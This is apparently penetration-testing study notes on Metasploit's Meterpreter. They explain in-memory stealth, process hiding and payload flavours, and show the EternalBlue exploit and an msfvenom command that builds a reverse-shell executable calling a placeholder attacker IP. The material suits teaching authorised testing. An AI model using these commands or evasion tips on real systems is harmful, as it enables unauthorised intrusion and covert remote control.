**Introduction to Meterpreter**

Meterpreter is a versatile payload within Metasploit, designed to enhance the penetration testing process. Acting as an agent within a command-and-control framework, Meterpreter provides specialized commands to interact with the target operating system, files, and more. It operates without being explicitly installed on the target system, running stealthily in memory.


### **How Does Meterpreter Work?**

1. **Memory-Based Execution**  
   Meterpreter runs in the system's memory (RAM) instead of being written to disk. This reduces the chances of detection by antivirus software, which primarily scans files on disk.

2. **Stealth Features**  
   - Meterpreter appears as a legitimate process, avoiding direct identification (e.g., no `meterpreter.exe` or `meterpreter.dll` on the target).
   - Encrypted communication (e.g., TLS) between the target and the attacker prevents detection by network-based IPS/IDS solutions unless encrypted traffic is decrypted and inspected.

3. **Process Identification**  
   - The `getpid` command identifies the process ID (PID) under which Meterpreter is running.  
   - The `ps` command lists processes on the target machine. For instance, in the provided example, Meterpreter runs under the process `spoolsv.exe` with PID 1304, appearing as a legitimate system process.


### **Commands and Observations**

- **`getpid` Command**  
  Displays the PID of the process running Meterpreter.  
  Example:  
  ```
  meterpreter > getpid  
  Current pid: 1304  
  ```

- **`ps` Command**  
  Lists all processes on the target system, revealing that PID 1304 corresponds to `spoolsv.exe`.  
  Example:  
  ```
  meterpreter > ps  
  ```

- **Inspecting DLLs**  
  Even if DLLs loaded by the process are inspected, nothing indicates Meterpreter's presence, enhancing stealth.

- **Process Details**  
  Using `tasklist /m /fi "pid eq 1304"`, the DLLs associated with the process (e.g., `spoolsv.exe`) can be viewed. However, these DLLs appear legitimate, further concealing Meterpreter's activity.


### **Key Features**

1. **Stealth Operations**  
   Meterpreter disguises itself by blending with legitimate processes and avoids writing identifiable files to disk.

2. **Encrypted Communication**  
   Communication between Meterpreter and the attacker's system is encrypted, reducing detection by network security tools.

3. **Detection Limitations**  
   While stealthy, most antivirus solutions can still detect Meterpreter. However, techniques to detect it are beyond the scope of this discussion.

---
---


The **Meterpreter Flavors** topic is essential to understand the variety of payloads we can use in Metasploit based on the target system, available components, and network conditions.


### **Payload Categories**
1. **Inline (Single)**:
   - Entire payload sent in one step.
2. **Staged**:
   - Divided into two steps: 
     1. Stager installed.
     2. Remaining payload fetched by the stager.

### **Meterpreter Versions**
The available Meterpreter payloads support various platforms:
- **Android**
- **Apple iOS**
- **Java**
- **Linux**
- **OSX**
- **PHP**
- **Python**
- **Windows**

#### Listing Available Meterpreter Payloads
Run the following to list them:
```bash
msfvenom --list payloads | grep meterpreter
```
Output example:
- **Android**: `android/meterpreter/reverse_tcp`
- **Linux**: `linux/x64/meterpreter_reverse_https`
- **Windows**: `windows/x64/meterpreter/bind_tcp`


### **Key Factors in Choosing Meterpreter Payload**
1. **Target OS**:
   - Identify whether the target is Android, Linux, Windows, etc.
2. **Target Components**:
   - Verify if components like Python, PHP, or Java are installed.
3. **Network Constraints**:
   - Consider connection options: raw TCP, HTTPS, IPv6, etc.


### **Exploits and Default Payloads**
Some exploits have pre-configured payloads:
- Example: `ms17_010_eternalblue`
  ```bash
  msf6 > use exploit/windows/smb/ms17_010_eternalblue
  [*] Using configured payload windows/x64/meterpreter/reverse_tcp
  ```

List compatible payloads for an exploit:
```bash
show payloads
```


### **Practical Command Examples**
- **Choose Payload**: 
  ```bash
  set payload windows/x64/meterpreter/reverse_tcp
  ```
- **Generate Standalone Payload**:
  ```bash
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f exe -o payload.exe
  ```

---
---


